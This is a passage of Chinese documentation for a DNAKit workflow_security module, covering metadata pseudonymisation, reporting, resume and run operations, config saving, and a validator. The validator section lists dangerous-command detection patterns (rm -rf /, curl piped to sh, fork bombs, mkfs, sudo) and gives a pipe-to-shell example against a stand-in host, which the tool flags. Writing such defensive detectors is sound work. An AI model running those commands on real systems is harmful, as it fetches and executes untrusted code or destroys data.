优先）。敏感键的值整体被替换，值为映射或列表时也一样。`mode`：`redact`（默认）写入 `"[REDACTED]"`，不需要任何密钥；`drop` 删除该键；`hash` 写入以 `options['salt']`（必填，至少 8 个字符的字符串，否则抛出 `ConfigurationError`）为密钥、对 UTF-8 值（字符串按原样，其他值用紧凑的、键排序的 JSON）计算的 HMAC-SHA256 的前 `digest_chars`（默认 16，范围 8 到 64）个十六进制字符。同一盐值下哈希是确定的，所以相同的值仍可关联，知道盐值的人可以猜出低熵的值；请保密盐值。启用 `scan_text`（默认 `True`）时，任何位置的字符串值（包括保留键下的值和列表中的值）都会被扫描电子邮件地址、类似社保号的数字（`123-45-6789`）、国际电话号码（`+44 20 7946 0958`）和北美格式的 10 位号码；命中部分变为 `[REDACTED:email]`、`[REDACTED:ssn]`、`[REDACTED:phone]`。电话模式也会命中单纯的 10 位编号，因此可能过度脱敏。它不做的事：不对日期做平移或泛化，不泛化超过 89 岁的年龄和小地理单位，不识别自由文本中的姓名和其他准标识符，不改写本身含有标识符的字典键，也不对照 HIPAA 或 GDPR 的标识符清单检查。共享前请人工复核输出。datetime 会转为 ISO 字符串；其他非 JSON 类型（集合、bytes、对象）、超过 64 层的嵌套或循环引用会抛出 `InputFormatError`。

- **API：** `dnakit.workflow_security.pseudonymize_metadata_fields(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：映射、映射列表，或其中之一的 JSON 文本；其他输入抛出 `InputFormatError`（错误码 `INVALID_METADATA_INPUT`、`INVALID_METADATA_JSON`、`UNSUPPORTED_METADATA_VALUE`、`METADATA_TOO_DEEP`，均带 `hint`）。`options`：`mode`（`"redact"` | `"drop"` | `"hash"`，默认 `"redact"`）、`salt`（至少 8 个字符的字符串，`hash` 必填）、`digest_chars`（8 到 64，默认 16，仅 `hash`）、`keys`（额外的敏感键名，字符串或列表）、`keep`（永不视为敏感的键名）、`scan_text`（默认 `True`）、`backend`（仅作标签）。无效的选项抛出 `ConfigurationError`（`PSEUDONYMIZE_SALT_REQUIRED`、`INVALID_PSEUDONYMIZE_MODE`、`INVALID_DIGEST_CHARS`、`INVALID_PSEUDONYMIZE_KEYS`、`INVALID_PSEUDONYMIZE_OPTIONS`）。

- **输出：** 标准封装：`status`（`"ok"`）、`module`（`"workflow_security"`）、`operation`（`"pseudonymize_metadata_fields"`）、`provenance`（`implementation` 为 `"native"`，另有 `backend`）、`input_summary`、`warnings` 和 `result`。`input_summary` 特意只含 `record_count` 和 `n_keys`（访问过的映射键个数）：不含长度，也不含未受保护输入的 SHA-256。`result` 含 `metadata`（转换后的映射或列表；JSON 文本输入以解析后的结构返回）、`mode`、`n_redacted`（= `n_key_matches` + `n_text_matches`）、`n_key_matches`、`n_text_matches`、`text_matches_by_pattern`、`redacted_paths`（类 JSON 路径的键路径，如 `$.visits[0].dob`，绝不含值；最多 10000 条，`redacted_paths_truncated` 表示是否还有更多）和 `warnings`。警告总是声明：该方法基于键名和模式，并不保证完成去标识化，不对日期、89 岁以上年龄或小地理单位做平移或泛化，自由文本仍可能识别出个人，共享前必须复核输出；同一份列表同时出现在 `result.warnings` 和封装的 `warnings` 中。输出的任何位置都不会出现盐值或原始值。

- **示例代码：**

```python
import json
from dnakit.workflow_security import pseudonymize_metadata_fields

metadata = {
    "name": "Ada Lovelace",
    "patient_id": "P-001",
    "Email": "ada@example.org",
    "age": 36,
    "visit": {
        "name": "Ada Lovelace",
        "note": "call +1 (415) 555-0100 or ada@example.org, SSN 123-45-6789",
    },
}

# default: values of sensitive keys at any depth become "[REDACTED]"; patterns inside text are replaced
result = pseudonymize_metadata_fields(metadata)
print(json.dumps(result, indent=2))

# keyed hash: deterministic tokens that depend on a secret salt (required, >= 8 characters)
hashed = pseudonymize_metadata_fields(metadata, options={"mode": "hash", "salt": "example-salt-123", "digest_chars": 12})
print(json.dumps(hashed["result"]["metadata"], indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "pseudonymize_metadata_fields",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {
    "record_count": 1,
    "n_keys": 7
  },
  "warnings": [
    "Pseudonymisation is key-name and pattern based only. It is NOT a guarantee of de-identification and does not by itself satisfy HIPAA or GDPR requirements.",
    "Dates are not shifted or generalised; ages over 89 and small geographic units are not generalised.",
    "Free text may still identify a person: only e-mail, phone and SSN-like patterns are scanned, names and other identifiers inside text are not detected; dictionary keys that themselves contain identifiers are not rewritten.",
    "Review the output manually before sharing it."
  ],
  "status": "ok",
  "result": {
    "metadata": {
      "name": "[REDACTED]",
      "patient_id": "[REDACTED]",
      "Email": "[REDACTED]",
      "age": 36,
      "visit": {
        "name": "[REDACTED]",
        "note": "call [REDACTED:phone] or [REDACTED:email], SSN [REDACTED:ssn]"
      }
    },
    "mode": "redact",
    "n_redacted": 7,
    "n_key_matches": 4,
    "n_text_matches": 3,
    "text_matches_by_pattern": {
      "email": 1,
      "phone": 1,
      "ssn": 1
    },
    "redacted_paths": [
      "$.name",
      "$.patient_id",
      "$.Email",
      "$.visit.name",
      "$.visit.note"
    ],
    "redacted_paths_truncated": false,
    "warnings": [
      "Pseudonymisation is key-name and pattern based only. It is NOT a guarantee of de-identification and does not by itself satisfy HIPAA or GDPR requirements.",
      "Dates are not shifted or generalised; ages over 89 and small geographic units are not generalised.",
      "Free text may still identify a person: only e-mail, phone and SSN-like patterns are scanned, names and other identifiers inside text are not detected; dictionary keys that themselves contain identifiers are not rewritten.",
      "Review the output manually before sharing it."
    ]
  }
}
{
  "name": "69272bf887f1",
  "patient_id": "61df4f560250",
  "Email": "0e934605ef5f",
  "age": 36,
  "visit": {
    "name": "69272bf887f1",
    "note": "call [REDACTED:phone] or [REDACTED:email], SSN [REDACTED:ssn]"
  }
}
```

## 18) report

- **作用：** 把工作流规范的概况（有效性、执行顺序、发现项、资源估算）汇总为 Markdown 或 JSON。

- **处理方法：** 基于与 `validate`（依赖分析及凭据/命令/路径扫描）和 `estimate`（尽早调度，默认 1 个 cpu，其他资源为 0）相同的检查生成；当不存在有效顺序或资源值无效时，省略估算部分。

- **API：** `dnakit.workflow_security.report(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：工作流规范（映射、JSON/YAML 文本或文件路径）。`options`：`format`（默认 `"markdown"`，或 `"json"`；其他值抛 `ConfigurationError`）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `format`、`valid` 和 `report`（Markdown 文本；`format: "json"` 时为含 `name`、`source`、`valid`、`step_count`、`order`、`findings`、`estimate` 的映射）。

- **示例代码：**

```python
import json
from dnakit.workflow_security import report

workflow = {
    "name": "demo",
    "steps": [
        {"id": "qc", "command": ["fastqc", "reads.fq"], "cpus": 2, "memory_mb": 100, "runtime_s": 10},
        {"id": "align", "command": ["bwa", "mem", "ref.fa", "reads.fq"], "depends_on": ["qc"], "cpus": 4, "memory_mb": 800, "runtime_s": 60},
        {"id": "report", "command": ["multiqc", "."], "depends_on": ["align"], "runtime_s": 5},
    ],
}
result = report(workflow)
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "report",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "format": "markdown",
    "valid": true,
    "report": "# Workflow report: demo\n\n- source: inline\n- steps: 3\n- valid: yes\n\n## Execution order\n\n1. qc\n2. align\n3. report\n\n## Findings\n\n(none)\n\n## Resource estimate\n\n- wall time: 75.0 s\n- total cpu time: 265.0 cpu-s\n- peak cpus: 4.0\n- peak memory: 800.0 MB\n- critical path: qc -> align -> report\n"
  }
}
```

## 19) resume

- **作用：** 从已校验的检查点恢复，或根据清单恢复 DNAKit 工作流运行。

- **处理方法：** 若 `input` 是 `dnakit-checkpoint-v1` 文档，则由 `state` 重新计算 `state_sha256`，不一致则抛 `InputFormatError`（`CHECKPOINT_CORRUPT`）。否则 `input` 必须是 DNAKit 工作流文件的路径，并调用 `dnakit.workflows.run_workflow(path, resume=True)`（只运行内置的确定性操作，从不执行命令）。

- **API：** `dnakit.workflow_security.resume(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：检查点（映射、JSON 文本或文件路径）或 DNAKit 工作流文件路径。`options` 不起作用。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；对检查点，`result` 含 `kind: "checkpoint"`、`valid`、`step`、`created_at` 和 `state`；对工作流文件，`result` 为 `{"kind": "workflow", ...}` 加上运行结果（`run_id`、`status`、`resumed`、`steps`、`artifacts` 等），且 `provenance.implementation` 为 `dnakit.workflows.run_workflow`。

- **示例代码：**

```python
import json
from dnakit.workflow_security import checkpoint, resume

document = checkpoint({"done": ["qc"]}, options={"step": "after_qc", "timestamp": "2026-01-01T00:00:00+00:00"})["result"]["checkpoint"]
result = resume(document)
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "resume",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "kind": "checkpoint",
    "valid": true,
    "step": "after_qc",
    "created_at": "2026-01-01T00:00:00+00:00",
    "state": {
      "done": [
        "qc"
      ]
    }
  }
}
```

## 20) retry

- **作用：** 未实现：重试意味着重新执行失败的作业，而这里从不执行用户命令。

- **处理方法：** 不做任何计算。如需继续 DNAKit 工作流或检查点，请用 `resume`。

- **API：** `dnakit.workflow_security.retry(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：任意值（仅在 `input_summary` 中汇总）；`options` 不起作用。

- **输出：** 始终返回 `status: "not_implemented"` 的封装，含 `required_dependency`（“拥有该失败作业的执行后端”）和 `message`（请用 resume 继续 DNAKit 工作流或检查点；不支持重新运行任意作业），没有 `result`；正常调用不会抛出异常。

- **示例代码：**

```python
import json
from dnakit.workflow_security import retry

result = retry("job-42")
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "retry",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "an execution backend that owns the failed job",
  "message": "Use resume to continue a DNAKit workflow or checkpoint; re-running arbitrary jobs is not supported."
}
```

## 21) run

- **作用：** 用内置的确定性操作运行 DNAKit 工作流文件（不执行命令，不联网）。

- **处理方法：** 文件为 `dnakit-workflow-v1` 模式的 JSON/YAML 工作流（见 `dnakit.workflows.load_workflow`），由 `dnakit.workflows.run_workflow` 执行，且只写入工作流自己的 `output_dir`。使用 `dry_run` 时只校验和规划，不写任何内容。

- **API：** `dnakit.workflow_security.run(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：工作流文件路径（其他类型会抛 `InputFormatError`）。`options`：`dry_run`（默认 false）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`（`provenance.implementation` 为 `dnakit.workflows.run_workflow`）；`result` 为运行结果：`run_id`、`status`（`dry-run` 或 `succeeded`）、`dry_run`、`resumed`、`spec_sha256`、`input_sha256`、`output_dir`、`manifest_path`、`manifest_artifact`、`steps` 和 `artifacts`。示例中绝对路径 `output_dir` 被替换为 `/path/to/work/out`。

- **示例代码：**

```python
import json
from dnakit.workflow_security import run

open("input.fasta", "w").write(">one\nACGT\n")
config = {
    "schema_version": "dnakit-workflow-v1",
    "run_id": "r1",
    "input": {"path": "input.fasta", "format": "fasta", "alphabet": "iupac"},
    "output_dir": "out",
    "seed": 1,
    "error_policy": "raise",
    "overwrite": False,
    "steps": [{"id": "n", "operation": "normalize", "input": "input",
               "params": {"keep_ambiguous": True, "keep_u": False, "keep_other": False}}],
}
open("wf.json", "w").write(json.dumps(config))
result = run("wf.json", options={"dry_run": True})
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "run",
  "provenance": {
    "implementation": "dnakit.workflows.run_workflow",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "run_id": "r1",
    "status": "dry-run",
    "dry_run": true,
    "resumed": false,
    "spec_sha256": "e9473c3fbc03c5dfbfd14fea30fe7228a11d8f77ba7db134058c9f2e3b37f643",
    "input_sha256": "fc4994f16af758c46d6ac71d0807d25b3b2ca2390e7de18d598bfb9f5dde6b98",
    "output_dir": "/path/to/work/out",
    "manifest_path": null,
    "manifest_artifact": null,
    "steps": [
      {
        "id": "n",
        "operation": "normalize",
        "input_ref": "input",
        "status": "planned",
        "params": {
          "keep_ambiguous": true,
          "keep_u": false,
          "keep_other": false
        },
        "started_at": null,
        "finished_at": null,
        "input_sha256": null,
        "record_count": null,
        "summary": {
          "execution": "not started"
        },
        "artifacts": [],
        "error": null
      }
    ],
    "artifacts": []
  }
}
```

## 22) save_config

- **作用：** 把配置映射保存为规范化的美化 JSON，并拒绝包含凭据的配置。

- **处理方法：** 除非 `allow_secrets` 为 true，否则看似凭据的文本（AWS 密钥 id、私钥块、GitHub/Slack 令牌、bearer 令牌、`password=...` 形式的赋值）会抛 `ConfigurationError`（`SECRET_IN_CONFIG`），消息中的值已打码。文件为原子写入，键排序、2 空格缩进、末尾换行；NaN 或非 JSON 值会抛 `InputFormatError`。

- **API：** `dnakit.workflow_security.save_config(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：可 JSON 序列化的映射。`options`：`output`（必填文件路径，否则抛 `ConfigurationError`）、`overwrite`（默认 false）、`allow_secrets`（默认 false）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `path`、`bytes` 和文件内容的 `sha256`。

- **示例代码：**

```python
import json
from dnakit.workflow_security import save_config

result = save_config({"threads": 4, "reference": "GRCh38"}, options={"output": "config.json"})
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "save_config",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "path": "config.json",
    "bytes": 44,
    "sha256": "61231a6206b26da8c02f82d73113d30fbc65a693a883e2dd65d2183d4702a44d"
  }
}
```

## 23) set_random_seed

- **作用：** 用一个整数为 Python 的 `random`（以及可用时的 NumPy / PyTorch）设置随机种子，以便结果可复现。

- **处理方法：** 总会调用 `random.seed`；已安装 NumPy 时调用 `numpy.random.seed`；仅当进程中已导入 PyTorch 时才调用 `torch.manual_seed`。这是有意改变全局解释器状态。`PYTHONHASHSEED` 在启动后无法更改，只作报告。

- **API：** `dnakit.workflow_security.set_random_seed(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：[0, 2**32 - 1] 内的整数种子（布尔值、其他类型和越界值会抛 `InputFormatError`）。`options`：`seed`，优先于 `input`。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `seed`、`seeded`（已设置种子的库，如 `["random", "numpy"]`）和 `python_hash_seed`（当前 `PYTHONHASHSEED`，或 `null`）。

- **示例代码：**

```python
import json
from dnakit.workflow_security import set_random_seed

result = set_random_seed(42)
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "set_random_seed",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "seed": 42,
    "seeded": [
      "random",
      "numpy"
    ],
    "python_hash_seed": null
  }
}
```

## 24) submit_cloud_job

- **作用：** 未实现：提交云作业需要云账号、凭据和云服务商 SDK。

- **处理方法：** 不做任何计算；没有配置云后端，且 `workflow_security` 也不会在远端执行用户命令。

- **API：** `dnakit.workflow_security.submit_cloud_job(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：任意值（仅在 `input_summary` 中汇总）；`options` 不起作用。

- **输出：** 始终返回 `status: "not_implemented"` 的封装，含 `required_dependency`（“云服务商凭据和 SDK（AWS Batch、Google Batch、Azure Batch 等）”）和 `message`（未配置云后端，且 workflow_security 也不会在远端执行用户命令），没有 `result`；正常调用不会抛出异常。

- **示例代码：**

```python
import json
from dnakit.workflow_security import submit_cloud_job

result = submit_cloud_job({"image": "biocontainers/fastqc", "command": ["fastqc", "reads.fq"]})
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "submit_cloud_job",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "cloud provider credentials and SDK (AWS Batch, Google Batch, Azure Batch, ...)",
  "message": "No cloud backend is configured, and workflow_security does not execute user commands remotely either."
}
```

## 25) submit_hpc_job

- **作用：** 未实现：提交 HPC 作业意味着在集群上用用户提供的脚本运行 `sbatch`/`qsub`。

- **处理方法：** 不做任何计算；`workflow_security` 从不执行用户命令。

- **API：** `dnakit.workflow_security.submit_hpc_job(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：任意值（仅在 `input_summary` 中汇总）；`options` 不起作用。

- **输出：** 始终返回 `status: "not_implemented"` 的封装，含 `required_dependency`（“PATH 中的集群调度器（sbatch、qsub、bsub）”）和 `message`（作业提交会通过调度器执行用户脚本，而 workflow_security 从不执行用户命令），没有 `result`；正常调用不会抛出异常。

- **示例代码：**

```python
import json
from dnakit.workflow_security import submit_hpc_job

result = submit_hpc_job({"script": "run.sh", "queue": "short"})
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "submit_hpc_job",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "a cluster scheduler (sbatch, qsub, bsub) on PATH",
  "message": "Job submission executes a user script through a scheduler; workflow_security never executes user commands."
}
```

## 26) validate

- **作用：** 校验工作流规范：结构、依赖图（未知 id、环）以及安全扫描。

- **处理方法：** 结构检查：步骤非空且 id 唯一并匹配 `[A-Za-z0-9][A-Za-z0-9_.-]{0,63}`；`command` 为非空字符串或字符串列表；`cpus` > 0，`memory_mb`/`runtime_s`/`disk_mb` >= 0；`depends_on` 引用已存在的步骤，无自依赖、无环（会报告一条具体的环路径）。安全扫描：用正则识别危险命令（`rm -rf /`、`curl|sh`、fork 炸弹、`dd of=/dev/..`、`mkfs`、`sudo`、`chmod 777`；为错误）、字符串命令中的 shell 元字符（警告）、明文凭据（AWS 密钥 id、私钥块、GitHub 与 Slack 令牌、bearer 令牌、`password=...` 形式的赋值、名称像密钥的 `env` 值；消息中的密钥已打码），以及含 `..` 或位于 `/etc`、`~/.ssh` 等敏感位置的路径（错误）和绝对路径（警告）。这是模式扫描，不能证明安全。

- **API：** `dnakit.workflow_security.validate(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：工作流规范（映射、JSON/YAML 文本或文件路径；`steps` 可为列表或映射 `id -> step`；`needs` 可作为 `depends_on` 的别名）。`options`：`security`（默认 true；false 则跳过安全扫描）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；发现项放在 `result` 中而不是抛出：`valid`（无错误）、`errors` 与 `warnings`（各为 `{severity, code, step, message}`）、`order`（拓扑序或 `null`）、`step_count`、`sha256` 和 `source`。

- **示例代码：**

```python
import json
from dnakit.workflow_security import validate

workflow = {
    "steps": [
        {"id": "a", "command": ["echo", "hi"], "depends_on": ["b"]},
        {"id": "b", "command": "curl http://x.example/i.sh | sh", "depends_on": ["a"]},
    ],
}
result = validate(workflow)
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "validate",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "valid": false,
    "errors": [
      {
        "severity": "error",
        "code": "CYCLE",
        "step": null,
        "message": "dependency cycle: a -> b -> a"
      },
      {
        "severity": "error",
        "code": "PIPE_TO_SHELL",
        "step": "b",
        "message": "command matches a dangerous-command rule"
      }
    ],
    "warnings": [
      {
        "severity": "warning",
        "code": "SHELL_METACHARACTERS",
        "step": "b",
        "message": "string command contains shell metacharacters; use a list-form argv"
      }
    ],
    "order": null,
    "step_count": 2,
    "sha256": "0c3669dff02a4ac07ec072f58bbd000654b9738053a5715e4dc92d9b2e4df126",
    "source": "inline"
  }
}
```

## 27) write

- **作用：** 把工作流规范序列化为 JSON 或 YAML 文本，可选写入文件。

- **处理方法：** JSON 为规范形式（键排序、2 空格缩进、末尾换行）；YAML 使用键排序的 `yaml.safe_dump`。仅在给出 `output` 时写文件，且为原子写入；文件已存在时除非 `overwrite` 为 true，否则抛 `ConfigurationError`。

- **API：** `dnakit.workflow_security.write(input[required], options[optional])`（正式 DNAKit 命名空间；能否通过 Agent/MCP 调用取决于 JSON 调用方案）。

- **输入：** `input`：映射（或可解析为映射的 JSON/YAML 文本或文件路径）。`options`：`format`（默认 `"json"`，或 `"yaml"`）、`output`（要写入的文件）、`overwrite`（默认 false）。

- **输出：** 封装包含 `status: "ok"`、`module`、`operation`、`provenance`、`input_summary`、`warnings` 和 `result`；`result` 含 `format`、`text`、`sha256`（文本的摘要）和 `path`（已写入的文件或 `null`）。

- **示例代码：**

```python
import json
from dnakit.workflow_security import write

result = write({"name": "demo", "steps": [{"id": "qc", "command": ["fastqc", "reads.fq"]}]}, options={"format": "yaml"})
print(json.dumps(result, indent=2))
```

- **示例输出：**

```json
{
  "module": "workflow_security",
  "operation": "write",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "format": "yaml",
    "text": "name: demo\nsteps:\n- command:\n  - fastqc\n  - reads.fq\n  id: qc\n",
    "sha256": "6ae77919a6927bf19253b6fcbc48c41490a49744db86149c8b916a40fde4c436",
    "path": null
  }
}
```
